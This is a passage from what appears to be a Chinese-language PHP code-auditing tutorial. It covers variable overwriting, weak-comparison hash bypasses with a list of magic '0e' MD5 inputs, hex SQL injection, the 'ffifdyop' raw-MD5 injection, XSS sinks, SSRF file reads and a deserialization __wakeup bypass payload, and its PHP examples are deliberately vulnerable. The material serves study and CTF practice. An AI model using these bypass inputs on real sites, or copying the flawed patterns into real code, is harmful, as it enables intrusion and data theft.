<li>prefix：变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name = <span class="string">'who'</span>;</span><br><span class="line">	import_request_variables(<span class="string">'gp'</span>);</span><br><span class="line">	<span class="keyword">if</span>($name == <span class="string">'Ameng'</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'You are not Ameng'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果什么变量也不传，那么页面将回显<code>You are not Ameng</code>如果通过GET或者POST传入<code>name=Ameng</code>那么页面就会回显<code>Ameng</code></p>
<p>可以见到此函数还是很危险的，没有修复方法，不使用就是最好的方法。所以在新版本的 PHP 中已经废弃了这个函数。</p>
<h4 id="foreach"><a href="#foreach" class="headerlink" title="foreach()"></a>foreach()</h4><p><code>foreach</code> 语法结构提供了遍历数组的简单方式。<code>foreach</code> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $value)</span><br><span class="line">    statement</span><br><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure>

<p>第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p>
<p>第二种格式做同样的事，只是除了当前单元的键名也会在每次循环中被赋给变量 $key。</p>
<p>那么这个函数如何实现变量的覆盖呢？我们来看个案例.</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name = <span class="string">'who'</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)	&#123;  </span><br><span class="line">            $$key = $value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span>($name == <span class="string">"Ameng"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are right!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are flase!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么执行结果是怎样的呢？当我们直接打开页面的时候它会输出<code>You are false!</code>,而当我们通过GET传参<code>name=Ameng</code>的时候，它会回显<code>You are right!</code>。那么这是为什么呢？我们来分析一下</p>
<p>关键点就在于<code>$$</code>这种写法。这种写法称为可变变量。一个变量能够获取一个普通变量的值作为这个可变变量的变量名。当使用<code>foreach</code>来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。这样就产生了变量覆盖漏洞，如上代码示例。其执行过程为<code>$$key</code>=<code>$name</code>，最后赋值为<code>$value</code>，从而实现了变量覆盖。</p>
<h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><h4 id="md5-函数和sha1-绕过"><a href="#md5-函数和sha1-绕过" class="headerlink" title="md5()函数和sha1()绕过"></a>md5()函数和sha1()绕过</h4><p>关于这两个函数想必我们不陌生，无论是在实际代码审计中，还是在CTF比赛中，这些我们都是碰到过的函数。那么当我们遇到用这两个函数来判断的时候，如果绕过呢？</p>
<p>PHP 在处理哈希字符串的时候，会使用<code>!=</code>或者<code>==</code>来对哈希值进行比较，它会把每一个<code>0E</code>开头的哈希值都解释为0，那么这个时候问题就来了，如果两个不同的值，经过哈希以后它们都变成了<code>0E</code>开头的哈希值，那么 PHP 就会将它们视作相等处理。那么<code>0E</code>开头的哈希值有哪些呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>

<p>来个简单的例子吧</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">	$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">	<span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'这就是弱类型绕过'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'再思考一下'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从上面我给出的哪些值中，挑两个不同的值传入参数，就能看到相应的结果</p>
<p>上面是<code>md5()</code>函数的绕过姿势，那么<code>sha1()</code>如何绕过呢？再来看一个简单的例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">	$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($a,$b))&#123;</span><br><span class="line">		<span class="keyword">if</span>(sha1($a) === sha1($b))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'nice!!!'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Try again!'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当我们传入<code>a[]=1&amp;b[]=2</code>的时候，虽然它会给出警告，说我们应该传入字符串而不应该是数组，但是它还是输出了<code>nice!!!</code>，所以我们完全可以用数字来绕过<code>sha1()</code>函数的比较。</p>
<h4 id="is-numeric-绕过"><a href="#is-numeric-绕过" class="headerlink" title="is_numeric()绕过"></a>is_numeric()绕过</h4><p>我们先来了解一下这个函数。此函数是检测变量是否为数字或者数字字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">is_numeric( mixed $var) : bool</span><br></pre></td></tr></table></figure>

<p>如果<code>var</code>是数字或者数字字符串那么就返回TRUE，否则就返回FALSE。那么这里说的绕过是什么姿势呢？是十六进制。我们先来看一个简单的例子。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = is_numeric(<span class="string">'0x31206f722031'</span>);</span><br><span class="line">	<span class="keyword">if</span>($a)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'It meets my requirement'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Try again'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">It meets my requirement</span><br></pre></td></tr></table></figure>

<p>这里说一下<code>0x31206f722031</code>这个是什么？这个是<code>or 1=1</code>的十六进制，从这里可以看出，如果某处使用了此函数，并将修饰后的变量带入数据库查询语句中，那么我们就能利用此漏洞实现sql注入。同样的，这个漏洞再CTF比赛中也是很常见的。</p>
<h4 id="in-array-绕过"><a href="#in-array-绕过" class="headerlink" title="in_array()绕过"></a>in_array()绕过</h4><p>此函数用来检测数组中是否存在某个值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">in_array( mixed $needle, <span class="keyword">array</span> $haystack[, bool $strict = <span class="keyword">FALSE</span>] ) : bool</span><br></pre></td></tr></table></figure>

<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
<li>needle：带搜索的值(区分大小写)。</li>
<li>haystack：带搜索的数组。</li>
<li>strict：若此参数的值为TRUE，那么<code>in_array()</code>函数将会检查needle的类型是否和haystack中的类型相同。</li>
</ul>
<p>有时候我们再传入一个数组的时候，代码可能会过滤某些敏感字符串，但是我们又需要传入这样的字符串，那么我们应该如何绕过它的检测呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $myarr = <span class="keyword">array</span>(<span class="string">'Ameng'</span>);</span><br><span class="line">	$needle = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(in_array($needle,$myarr))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"It's in array"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"not in array"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码示例执行的结果会是什么呢？从简单的逻辑上分析。0是不存在要搜索的数组中的，所以理论上，应该是输出<code>not in array</code>，但是实际却输出了<code>It&#39;s in array</code>。这是为什么呢？原因就在于PHP的默认类型转换。这里我们第三个参数并没有设置为<code>true</code>那么默认就是非严格比较，所以在数字与字符串进行比较时，字符串先被强制转换成数字，然后再进行比较。并且因为某些类型转换正在发生，就会导致发生数据丢失，并且都被视为相同。所以归根到底还是非严格比较导致的问题。所以再遇到这个函数用来变量检测的时候，我们可以看看第三个参数是否开启，若未开启，则存在数组绕过。</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	<span class="keyword">print</span>($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="echo"><a href="#echo" class="headerlink" title="echo()"></a>echo()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$str"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	printf($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf()"></a>sprintf()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	$a = sprintf($str);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$a"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="die"><a href="#die" class="headerlink" title="die()"></a>die()</h4><p>此函数输出一条信息，并退出当前脚本。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	<span class="keyword">die</span>($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h4><p>此函数打印变量的相关信息，用来显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开之，通过缩进显示其结构。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	$a = <span class="keyword">array</span>($str);</span><br><span class="line">	var_dump($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="var-export"><a href="#var-export" class="headerlink" title="var_export()"></a>var_export()</h4><p>此函数输出或者返回一个变量的字符串表示。它返回关于传递给该函数的变量的结构信息，和<code>var_dump</code>类似，不同的是其返回的表示是合法的 PHP 代码。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	$a = <span class="keyword">array</span>($str);</span><br><span class="line">	var_export($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP黑魔法"><a href="#PHP黑魔法" class="headerlink" title="PHP黑魔法"></a>PHP黑魔法</h3><h4 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h4><p><code>md5()</code>函数绕过sql注入。我们来看一个例子。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'flag is :'</span>.$flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里提交的参数通过<code>md5</code>函数处理，然后再进入SQL查询语句，所以常规的注入手段就不行了，那么如果md5后的转换成字符串格式变成了<code>&#39;or&#39;xxxx</code>的格式，不就可以注入了么。<code>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</code></p>
<p>转成字符串为<code>&#39;or&#39;6xxx</code></p>
<h4 id="eval-1"><a href="#eval-1" class="headerlink" title="eval()"></a>eval()</h4><p>在执行命令时，可使用分号构造处多条语句。类似这种。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$cmd = <span class="string">"echo 'a';echo '--------------';echo 'b';"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">eval</span>($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h4><p>存在<code>%00</code>截断，当遇到使用此函数来进行正则匹配时，我们可以用<code>%00</code>来截断正则匹配，从而绕过正则。</p>
<h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p>这个在前面介绍过，就是数组绕过技巧。</p>
<h4 id="curl-setopt"><a href="#curl-setopt" class="headerlink" title="curl_setopt()"></a>curl_setopt()</h4><p>存在ssrf漏洞。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'Ameng'</span>]);</span><br><span class="line">    <span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//使用file协议进行任意文件读取</span></span><br><span class="line"><span class="comment">//1.php?Ameng=file:///D:/phpstudy_pro/WWW/demo.txt</span></span><br></pre></td></tr></table></figure>

<h4 id="preg-replace-1"><a href="#preg-replace-1" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>此函数前面详细介绍过，/e模式下的命令执行。</p>
<h4 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode()"></a>urldecode()</h4><p>url二次编码绕过。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$name = urldecode($_GET[<span class="string">'name'</span>]);</span><br><span class="line">	<span class="keyword">if</span>($name = <span class="string">"Ameng"</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Plase~"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"sorry"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将Ameng进行二次url编码，然后传入即可得到满足条件。</p>
<h4 id="file-get-contents-1"><a href="#file-get-contents-1" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><p>常用伪协议来进行绕过。</p>
<h4 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a>parse_url()</h4><p>此函数主要用于绕过某些过滤，先简单了解一下函数的基本用法。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$url = <span class="string">"http://www.jlx-love.com/about"</span>;</span><br><span class="line">	$parts = parse_url($url);</span><br><span class="line">	print_r($parts);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">执行结果——&gt;</span><br><span class="line"><span class="keyword">Array</span> </span><br><span class="line">    ( </span><br><span class="line">    [scheme] =&gt; http </span><br><span class="line">    [host] =&gt; www.jlx-love.com 		[path] =&gt; /about </span><br><span class="line">	)</span><br></pre></td></tr></table></figure>

<p>可以看到这个函数把我们的变量值拆分成一个几个部分。那么绕过过滤又是说的哪回事呢？其实就是当我们在浏览器输入url时，那么就会将url中的\转换为/，从而就会导致<code>parse_url</code>的白名单绕过。</p>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>在了解一些函数之前，我们首先需要了解什么是序列化和反序列化。</p>
<p>序列化：把对象转换为字节序列的过程成为对象的序列化。</p>
<p>反序列化：把字节序列恢复为对象的过程称为对象的反序列化。</p>
<p>归根到底，就是将数据转化成一种可逆的数据结构，逆向的过程就是反序列化。</p>
<p>在 PHP 中主要就是通过<code>serialize</code>和<code>unserialize</code>来实现数据的序列化和反序列化。</p>
<p>那么漏洞是如何形成的呢？</p>
<p>PHP 的反序列化漏洞主要是因为未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而就可以导致各种危险行为。</p>
<p>那么我们先来看一看序列化后的数据格式是怎样的，了解了序列化后的数据，我们才能更好的理解和利用漏洞。所以我们来构造一段序列化的值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $who = <span class="string">"Ameng"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$a = serialize(<span class="keyword">new</span> Ameng);</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">O:<span class="number">5</span>:<span class="string">"Ameng"</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">"who"</span>;s:<span class="number">5</span>:<span class="string">"Ameng"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210425/16193177504420.png" alt="image-20210423051113545"></p>
<p>这里还要补充一点，就是关于变量的分类，变量的类别有三种：</p>
<ul>
<li>public：正常操作，在反序列化时原型就行。</li>
<li>protected：反序列化时在变量名前加上%00*%00。</li>
<li>private：反序列化时在变量名前加上%00类名%00。</li>
</ul>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>在我们反序列化时，会先检查类中是否存在<code>__wakeup()</code>如果存在，则执行。但是如果对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>执行<code>__destruct()</code>。</p>
<p>影响版本：</p>
<p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123; </span><br><span class="line">        <span class="keyword">public</span> $name=<span class="string">'1.php'</span>; </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct执行&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> highlight_file(<span class="keyword">$this</span>-&gt;name, <span class="keyword">true</span>); </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"wakeup执行&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name=<span class="string">'1.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">	$data = <span class="string">'O:5:"Ameng":2:&#123;s:4:"name";s:5:"2.php";&#125;'</span>;</span><br><span class="line">	unserialize($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//destruct执行</span></span><br></pre></td></tr></table></figure>

<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><p><code>__sleep()</code>函数刚好与<code>__waeup()</code>相反，前者是在序列化一个对象时被调用，后者是在反序列化时被调用。那么该如何利用呢？我们看看代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123; </span><br><span class="line">        <span class="keyword">public</span> $name=<span class="string">'1.php'</span>; </span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$name;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"sleep()执行&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> highlight_file(<span class="keyword">$this</span>-&gt;name, <span class="keyword">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"over&lt;br&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"wakeup执行&lt;br&gt;"</span>;         </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">	$a = <span class="keyword">new</span> Ameng(<span class="string">"2.php"</span>);</span><br><span class="line">	$b = serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//sleep()执行</span></span><br><span class="line"><span class="comment">//OVER</span></span><br></pre></td></tr></table></figure>

<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>这个函数的作用其实在上面的例子中已经显示了，就是在对象被销毁时调用，倘若这个函数中有命令执行之类的功能，我们完全可以利用这一点来进行漏洞的利用，得到自己想要的结果。</p>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p>这个函数的作用在<code>__sleep()</code>也是体现了的，这个函数就是在一个对象被创建时会调用这个函数，比如我在<code>__sleep()</code>中用这个函数来对变量进行赋值。</p>
<h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>此函数用来监视一个对象中的其他方法。当你尝试调用一个对象中不存在的或者被权限控制的方法，那么<code>__call</code>就会被自动调用</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;  </span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$args)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.<span class="string">"call执行失败"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($name,$args)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.<span class="string">"callStatic执行失败"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$a = <span class="keyword">new</span> Ameng;</span><br><span class="line">	$a-&gt;b();</span><br><span class="line">	Ameng::b();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//call执行失败</span></span><br><span class="line"><span class="comment">//callStatic执行失败</span></span><br></pre></td></tr></table></figure>

